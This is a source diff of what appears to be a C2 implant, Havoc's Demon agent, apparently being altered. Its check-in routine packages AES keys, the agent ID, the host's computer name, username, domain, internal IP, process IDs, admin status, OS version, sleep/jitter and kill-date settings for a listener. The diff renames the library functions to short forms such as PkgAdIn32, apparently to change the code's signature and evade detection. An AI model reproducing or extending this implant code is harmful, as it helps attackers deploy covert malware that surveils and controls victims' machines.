@@ -92,7 +92,7 @@ VOID ButterRou()
 }
 
 /* Init metadata buffer/package. */
-VOID ButterMeDat( PPACKAGE* metdat, BOOL Header )metdat
+VOID ButterMeDat( PPACKAGE* metdat, BOOL Header )
 {
     PVOID            Data       = NULL;
     PIP_ADAPTER_INFO Adapter    = NULL;
@@ -103,7 +103,7 @@ VOID ButterMeDat( PPACKAGE* metdat, BOOL Header )metdat
     /* Check we if we want to add the Agent Header + CommandID too */
     if ( Header )
     {
-        *metdat = PackageCreateWithMetaData( DEMON_INITIALIZE );
+        *metdat = PkgCreWiMetDat( DEMON_INITIALIZE );
 
         /* Do not destroy this package if we fail to connect to the listener. */
         ( *metdat )->Destroy = FALSE;
@@ -157,11 +157,11 @@ VOID ButterMeDat( PPACKAGE* metdat, BOOL Header )metdat
     */
 
     // Add AES Keys/IV
-    PackageAddPad( *metdat, ( PCHAR ) Instance->Config.AES.Key, 32 );
-    PackageAddPad( *metdat, ( PCHAR ) Instance->Config.AES.IV,  16 );
+    PkgAdPa( *metdat, ( PCHAR ) Instance->Config.AES.Key, 32 );
+    PkgAdPa( *metdat, ( PCHAR ) Instance->Config.AES.IV,  16 );
 
     // Add session id
-    PackageAddInt32( *metdat, Instance->Session.AgentID );
+    PkgAdIn32( *metdat, Instance->Session.AgentID );
 
     // Get Computer name
     dwLength = 0;
@@ -173,14 +173,14 @@ VOID ButterMeDat( PPACKAGE* metdat, BOOL Header )metdat
             if ( Instance->Win32.GetComputerNameExA( ComputerNameNetBIOS, Data, &dwLength ) )
                 PackageAddBytes( *metdat, Data, dwLength );
             else
-                PackageAddInt32( *metdat, 0 );
+                PkgAdIn32( *metdat, 0 );
             DATA_FREE( Data, dwLength );
         }
         else
-            PackageAddInt32( *metdat, 0 );
+            PkgAdIn32( *metdat, 0 );
     }
     else
-        PackageAddInt32( *metdat, 0 );
+        PkgAdIn32( *metdat, 0 );
 
     // Get Username
     dwLength = 0;
@@ -192,14 +192,14 @@ VOID ButterMeDat( PPACKAGE* metdat, BOOL Header )metdat
             if ( Instance->Win32.GetUserNameA( Data, &dwLength ) )
                 PackageAddBytes( *metdat, Data, dwLength );
             else
-                PackageAddInt32( *metdat, 0 );
+                PkgAdIn32( *metdat, 0 );
             DATA_FREE( Data, dwLength );
         }
         else
-            PackageAddInt32( *metdat, 0 );
+            PkgAdIn32( *metdat, 0 );
     }
     else
-        PackageAddInt32( *metdat, 0 );
+        PkgAdIn32( *metdat, 0 );
 
     // Get Domain
     dwLength = 0;
@@ -211,14 +211,14 @@ VOID ButterMeDat( PPACKAGE* metdat, BOOL Header )metdat
             if ( Instance->Win32.GetComputerNameExA( ComputerNameDnsDomain, Data, &dwLength ) )
                 PackageAddBytes( *metdat, Data, dwLength );
             else
-                PackageAddInt32( *metdat, 0 );
+                PkgAdIn32( *metdat, 0 );
             DATA_FREE( Data, dwLength );
         }
         else
-            PackageAddInt32( *metdat, 0 );
+            PkgAdIn32( *metdat, 0 );
     }
     else
-        PackageAddInt32( *metdat, 0 );
+        PkgAdIn32( *metdat, 0 );
 
     // Get internal IP
     dwLength = 0;
@@ -229,39 +229,39 @@ VOID ButterMeDat( PPACKAGE* metdat, BOOL Header )metdat
             if ( Instance->Win32.GetAdaptersInfo( Adapter, &dwLength ) == NO_ERROR )
                 PackageAddString( *metdat, Adapter->IpAddressList.IpAddress.String );
             else
-                PackageAddInt32( *metdat, 0 );
+                PkgAdIn32( *metdat, 0 );
             DATA_FREE( Adapter, dwLength );
         }
         else
-            PackageAddInt32( *metdat, 0 );
+            PkgAdIn32( *metdat, 0 );
     }
     else
-        PackageAddInt32( *metdat, 0 );
+        PkgAdIn32( *metdat, 0 );
 
     // Get Process Path
     PackageAddWString( *metdat, ( ( PRTL_USER_PROCESS_PARAMETERS ) Instance->Teb->ProcessEnvironmentBlock->ProcessParameters )->ImagePathName.Buffer );
 
-    PackageAddInt32( *metdat, ( DWORD ) ( ULONG_PTR ) Instance->Teb->ClientId.UniqueProcess );
-    PackageAddInt32( *metdat, ( DWORD ) ( ULONG_PTR ) Instance->Teb->ClientId.UniqueThread );
-    PackageAddInt32( *metdat, Instance->Session.PPID );
-    PackageAddInt32( *metdat, PROCESS_AGENT_ARCH );
-    PackageAddInt32( *metdat, BeaconIsAdmin( ) );
+    PkgAdIn32( *metdat, ( DWORD ) ( ULONG_PTR ) Instance->Teb->ClientId.UniqueProcess );
+    PkgAdIn32( *metdat, ( DWORD ) ( ULONG_PTR ) Instance->Teb->ClientId.UniqueThread );
+    PkgAdIn32( *metdat, Instance->Session.PPID );
+    PkgAdIn32( *metdat, PROCESS_AGENT_ARCH );
+    PkgAdIn32( *metdat, BeaconIsAdmin( ) );
     PackageAddInt64( *metdat, U_PTR( Instance->Session.ModuleBase ) );
 
     MemSet( &OsVersions, 0, sizeof( OsVersions ) );
     OsVersions.dwOSVersionInfoSize = sizeof( OsVersions );
     Instance->Win32.RtlGetVersion( &OsVersions );
-    PackageAddInt32( *metdat, OsVersions.dwMajorVersion    );
-    PackageAddInt32( *metdat, OsVersions.dwMinorVersion    );
-    PackageAddInt32( *metdat, OsVersions.wProductType      );
-    PackageAddInt32( *metdat, OsVersions.wServicePackMajor );
-    PackageAddInt32( *metdat, OsVersions.dwBuildNumber     );
-    PackageAddInt32( *metdat, Instance->Session.OS_Arch );
+    PkgAdIn32( *metdat, OsVersions.dwMajorVersion    );
+    PkgAdIn32( *metdat, OsVersions.dwMinorVersion    );
+    PkgAdIn32( *metdat, OsVersions.wProductType      );
+    PkgAdIn32( *metdat, OsVersions.wServicePackMajor );
+    PkgAdIn32( *metdat, OsVersions.dwBuildNumber     );
+    PkgAdIn32( *metdat, Instance->Session.OS_Arch );
 
-    PackageAddInt32( *metdat, Instance->Config.Sleeping );
-    PackageAddInt32( *metdat, Instance->Config.Jitter );
+    PkgAdIn32( *metdat, Instance->Config.Sleeping );
+    PkgAdIn32( *metdat, Instance->Config.Jitter );
     PackageAddInt64( *metdat, Instance->Config.Transport.KillDate );
-    PackageAddInt32( *metdat, Instance->Config.Transport.WorkingHours );
+    PkgAdIn32( *metdat, Instance->Config.Transport.WorkingHours );
 }
 
 VOID ButterInit( PVOID ModInst, PKAYN_ARGS KArgs )
